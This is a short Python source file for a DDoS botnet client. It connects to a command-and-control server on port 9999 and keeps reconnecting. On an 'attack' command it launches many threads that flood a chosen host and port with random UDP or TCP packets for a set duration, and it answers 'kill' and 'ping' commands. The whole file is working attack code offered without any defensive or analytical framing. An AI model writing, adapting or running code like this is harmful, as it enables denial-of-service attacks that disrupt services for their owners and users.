import subprocess
import threading
import time
import socket
import os, sys, random
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = '127.0.0.1'
        port = 9999
        s.connect((host, port))
        def ddos(*args):
            def dos(*args):
                t1=time.time()
                print("started")
                host=args[1]
                port=args[2]
                if args[0] == "udp":
                	s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                else:
                	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                bytes=random._urandom(10240)
                s.connect((host, int(port)))
                send=0
                while True:
                    if not run:
                        break
                    s.sendto(bytes, (host,int(port)))
                    send+=1
                    #print(str(send)+" Packets Sended Sucessful")
                s.close()
                print("run time {}".format(time.time()-t1))
            print(args)
            global run
            for n in range(int(args[4])):
                threading.Thread(target = dos,args=[*args]).start()
            time.sleep(int(args[3]))
            run=False
        while True:
            global run
            data = s.recv(1024)
            data=data[:].decode("utf-8")
            data=data.lower()
            if "attack" in data:
                s.send(str.encode("done"))
                data=data.replace("attack ","")
                data=data.split()
                run=True
                threading.Thread(target = ddos,args=data).start()
            elif "kill" in data:
                print("here")
                run=False
                s.send(str.encode("Server Stopped"))
            elif "ping" in data:
                s.send(str.encode("Pong"))
            else:
                s.send(str.encode("ERROR"))
    except:
        continue
